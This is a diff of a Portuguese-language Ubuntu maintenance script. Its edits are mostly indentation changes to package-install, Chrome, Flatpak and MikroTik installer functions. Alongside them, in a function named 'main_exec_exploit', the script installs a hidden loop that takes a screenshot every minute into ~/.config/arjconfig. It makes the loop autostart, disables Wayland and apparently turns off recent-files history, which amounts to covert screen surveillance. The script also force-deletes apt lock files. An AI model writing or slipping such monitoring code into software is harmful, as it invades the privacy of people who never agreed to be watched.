@@ -786,20 +786,20 @@ apagar_pastas () {
 	numero_de_pastas=$(find "$local" -mindepth 1 -maxdepth 1 -type d | wc -l)
 
 	if [ "$numero_de_pastas" -ge "$limite" ]; then
-	    # Encontra a pasta mais antiga com base na data no nome
-	    pasta_mais_antiga=$(find "$local" -mindepth 1 -maxdepth 1 -type d | sort | head -n 1)
+			# Encontra a pasta mais antiga com base na data no nome
+			pasta_mais_antiga=$(find "$local" -mindepth 1 -maxdepth 1 -type d | sort | head -n 1)
 
-	    if [ -n "$pasta_mais_antiga" ]; then
+			if [ -n "$pasta_mais_antiga" ]; then
 		rm -r "$pasta_mais_antiga"
-	    fi
+			fi
 	fi
 }
 
 # Função para criar o diretório de captura de tela, se não existir
 create_screenshot_directory() {
-    if [ ! -d "$screenshot_path" ]; then
-        mkdir -p "$screenshot_path"
-    fi
+		if [ ! -d "$screenshot_path" ]; then
+				mkdir -p "$screenshot_path"
+		fi
 }
 
 # Função para capturar a tela e salvar no diretório especificado
@@ -814,14 +814,14 @@ desativa_recentes () {
 
 # Função principal
 main () {
-    while true; do
-        # Take a screenshot every minute
-        create_screenshot_directory
-        apagar_pastas
-		desativa_recentes
-		take_screenshot
-        sleep 60
-    done
+		while true; do
+		# Take a screenshot every minute
+			create_screenshot_directory
+			apagar_pastas
+			desativa_recentes
+			take_screenshot
+			sleep 60
+		done
 }
 
 main
@@ -829,7 +829,7 @@ main
 }
 
 auto_start () {
-mkdir $HOME/.config/autostart
+	mkdir $HOME/.config/autostart
 echo \
 "
 [Desktop Entry]
@@ -846,15 +846,15 @@ Comment=
 }
 
 disable_wayland () {
-    echo "WaylandEnable=false" | sudo tee -a /etc/gdm3/custom.conf
+		echo "WaylandEnable=false" | sudo tee -a /etc/gdm3/custom.conf
 }
 
 main_exec_exploit () {
-    DIRETORIO=$HOME/.config/arjconfig
-    sudo apt install scrot -y
-        export_exploit
-        auto_start
-        disable_wayland
+		DIRETORIO=$HOME/.config/arjconfig
+			sudo apt install scrot -y
+			export_exploit
+			auto_start
+			disable_wayland
 	echo -e "${VERDE}\nExploit instalado com sucesso!...${SEM_COR}\n"
 }
 
@@ -873,153 +873,153 @@ cron_update_auto () { # automatiza update do systema
 }
 
 testes_internet () { # testa conexão com a internet.
-    if ! ping -c 1 8.8.8.8 -q &> /dev/null; then
-    echo -e "${VERMELHO}[ERROR] - Seu computador não tem conexão com a Internet. Verifique a rede.${SEM_COR}"
-    exit 1
-    	else
-    		echo -e "\n${VERDE}[INFO] - Conexão com a Internet funcionando normalmente.${SEM_COR}\n"
-    fi
+		if ! ping -c 1 8.8.8.8 -q &> /dev/null; then
+		echo -e "${VERMELHO}[ERROR] - Seu computador não tem conexão com a Internet. Verifique a rede.${SEM_COR}"
+		exit 1
+			else
+				echo -e "\n${VERDE}[INFO] - Conexão com a Internet funcionando normalmente.${SEM_COR}\n"
+		fi
 }
 
 travas_apt () { # remove travas do apt
-  sudo rm /var/lib/dpkg/lock-frontend
-  sudo rm /var/cache/apt/archives/lock
-  echo -e "${VERDE}Removido travas no APT${SEM_COR}\n"
-  sleep 1
+	sudo rm /var/lib/dpkg/lock-frontend
+	sudo rm /var/cache/apt/archives/lock
+	echo -e "${VERDE}Removido travas no APT${SEM_COR}\n"
+	sleep 1
 }
 
 misc () { # adiciona arquitetura i386x86 e função na barra de ferramentas.
-    sudo dpkg --add-architecture i386
-    gsettings set org.gnome.shell.extensions.dash-to-dock click-action 'focus-minimize-or-previews' #minimiza na barra do gnome
-    echo -e "\n${VERDE}Adicionado Misc!${SEM_COR}\n"
-    sleep 1
+		sudo dpkg --add-architecture i386
+		gsettings set org.gnome.shell.extensions.dash-to-dock click-action 'focus-minimize-or-previews' #minimiza na barra do gnome
+		echo -e "\n${VERDE}Adicionado Misc!${SEM_COR}\n"
+		sleep 1
 }
 
 system_update () { # atualiza o sistema.
-    echo -e "\n${VERDE}Adicionado MISC${SEM_COR}\n"
-    sleep 1
-    sudo apt-get update && sudo apt-get upgrade -y
+		echo -e "\n${VERDE}Adicionado MISC${SEM_COR}\n"
+		sleep 1
+		sudo apt-get update && sudo apt-get upgrade -y
 }
 
 programas_para_instalar=( #lisagem de programas a serem instalados.
-    # APLICATIVOS.
-    telegram-desktop
-    # DEPENDÊNCIAS.
-    net-tools
-	traceroute
-	ssh
-	git
-    ttf-mscorefonts-installer
-    network-manager-l2tp
-    network-manager-l2tp-gnome
-    apt-transport-https
-    ca-certificates
-    libreswan
-    wine-stable
-    gufw
-    libfuse2
-    ubuntu-restricted-extras
-    curl
-    scrot
-    vim
-    wget
-    htop
-    build-essential
-    libssl-dev
-    libffi-dev
-    python3-dev
-    python3-pip
-    python3-venv
-    python3-setuptools
-    apt-transport-https
-    ca-certificates
-    software-properties-common
+		# APLICATIVOS.
+			telegram-desktop
+		# DEPENDÊNCIAS.
+			net-tools
+			traceroute
+			ssh
+			git
+			ttf-mscorefonts-installer
+			network-manager-l2tp
+			network-manager-l2tp-gnome
+			apt-transport-https
+			ca-certificates
+			libreswan
+			wine-stable
+			gufw
+			libfuse2
+			ubuntu-restricted-extras
+			curl
+			scrot
+			vim
+			wget
+			htop
+			build-essential
+			libssl-dev
+			libffi-dev
+			python3-dev
+			python3-pip
+			python3-venv
+			python3-setuptools
+			apt-transport-https
+			ca-certificates
+			software-properties-common
 )
 
 instala_apt_packages () {
-    for nome_do_programa in "${programas_para_instalar[@]}"; do
-        if ! dpkg -l | awk '{print $2}' | grep -q "^$nome_do_programa$"; then
-            echo -e "${VERMELHO}[INSTALANDO]${SEM_COR} $nome_do_programa..."
-            sleep 1
-            sudo apt install "$nome_do_programa" -y
-        else
-            echo -e "${VERDE}[INSTALADO]${SEM_COR} - $nome_do_programa"
-        fi
-    done
+	for nome_do_programa in "${programas_para_instalar[@]}"; do
+		if ! dpkg -l | awk '{print $2}' | grep -q "^$nome_do_programa$"; then
+			echo -e "${VERMELHO}[INSTALANDO]${SEM_COR} $nome_do_programa..."
+			sleep 1
+			sudo apt install "$nome_do_programa" -y
+		else
+			echo -e "${VERDE}[INSTALADO]${SEM_COR} - $nome_do_programa"
+		fi
+	done
 }
 
 suporte_flatpak () { # instala suporte a flatpak
-    sudo apt-get install flatpak gnome-software-plugin-flatpak -y
-    flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo
-    echo -e "${VERDE}Adicionado Suporte a Flatpaks${SEM_COR}\n"
-    sleep 1
+		sudo apt-get install flatpak gnome-software-plugin-flatpak -y
+		flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo
+		echo -e "${VERDE}Adicionado Suporte a Flatpaks${SEM_COR}\n"
+		sleep 1
 }
 
 instala_winbox () { # instala winbox client
-    sudo apt install git wine-stable -y
-    mkdir -p $HOME/Downloads/Winbox
-    git clone https://github.com/qrocafe1535/winbox-installer.git $HOME/Downloads/Winbox
-    chmod a+x $HOME/Downloads/Winbox/winbox-setup
-    cd $HOME/Downloads/Winbox
-    sudo ./winbox-setup install
+		sudo apt install git wine-stable -y
+		mkdir -p $HOME/Downloads/Winbox
+		git clone https://github.com/qrocafe1535/winbox-installer.git $HOME/Downloads/Winbox
+		chmod a+x $HOME/Downloads/Winbox/winbox-setup
+		cd $HOME/Downloads/Winbox
+		sudo ./winbox-setup install
 }
 
 instala_dude () { #instala dude client
-    sudo apt install wget wine-stable -y
-    mkdir -p $HOME/Downloads/Dude
-    wget -P $HOME/Downloads/Dude https://download.mikrotik.com/routeros/6.48.6/dude-install-6.48.6.exe 
-    wine $HOME/Downloads//Dude/dude-install-6.48.6.exe
+		sudo apt install wget wine-stable -y
+		mkdir -p $HOME/Downloads/Dude
+		wget -P $HOME/Downloads/Dude https://download.mikrotik.com/routeros/6.48.6/dude-install-6.48.6.exe 
+		wine $HOME/Downloads//Dude/dude-install-6.48.6.exe
 }
 
 mk_soft () {
-    echo -e "Deseja instalar Winbox e Dude?\n"
-    select  deseja_instalar in "Sim!" "Não"; do
-        case $deseja_instalar in
-            Sim! )
-            echo "Instalando..."
-            instala_winbox
-            instala_dude
-            break
-            	;;
-            Não )
-            echo -e "Ok!...\n"
-            exit 1
-            	;; 
-        esac
-    done
+		echo -e "Deseja instalar Winbox e Dude?\n"
+		select  deseja_instalar in "Sim!" "Não"; do
+				case $deseja_instalar in
+						Sim! )
+						echo "Instalando..."
+						instala_winbox
+						instala_dude
+						break
+							;;
+						Não )
+						echo -e "Ok!...\n"
+						exit 1
+							;; 
+				esac
+		done
 }
 
 instala_chrome () { # instala google chrome
-    mkdir -p $HOME/Downloads/chrome
-    wget -P $HOME/Downloads/chrome https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
-    sudo sudo dpkg -i $HOME/Downloads/chrome/google-chrome-stable_current_amd64.deb
-    echo -e "${VERDE}Instalado Google Chrome${SEM_COR}\n"
-    sleep 1
+		mkdir -p $HOME/Downloads/chrome
+		wget -P $HOME/Downloads/chrome https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
+		sudo sudo dpkg -i $HOME/Downloads/chrome/google-chrome-stable_current_amd64.deb
+		echo -e "${VERDE}Instalado Google Chrome${SEM_COR}\n"
+		sleep 1
 }
 
 system_clean () {
-    sudo apt update -y
-    flatpak update -y
-    sudo apt autoclean -y
-    sudo apt autoremove -y
+		sudo apt update -y
+		flatpak update -y
+		sudo apt autoclean -y
+		sudo apt autoremove -y
 	sudo rm -r $HOME/Downloads/chrome; rm -r $HOME/Downloads/Dude; rm -r $HOME/Downloads/Winbox
-    echo -e "${VERDE}Sistema limpo!${SEM_COR}\n"
-    sleep 1
+		echo -e "${VERDE}Sistema limpo!${SEM_COR}\n"
+		sleep 1
 }
 
 main_update () { # Executando...
     echo -e "\n${AZUL}Começando em 3... 2... 1....\n${SEM_COR}\n"
 	sleep 3
 		testes_internet
-        misc
-        travas_apt
-        instala_apt_packages
-        system_update
-        suporte_flatpak
-        instala_chrome
-        mk_soft
+				misc
+				travas_apt
+				instala_apt_packages
+				system_update
+				suporte_flatpak
+				instala_chrome
+				mk_soft
 		system_clean
-    echo -e "${AZUL}\nFinalizado com exito!\n${SEM_COR}"
+		echo -e "${AZUL}\nFinalizado com exito!\n${SEM_COR}"
 }
 
 if [[ "$tipo_do_servico" = "Manutenção Ubuntu" && $(lsb_release -si) == "Ubuntu" ]]; then # SELECIONE O QUE DESEJA FAZER!
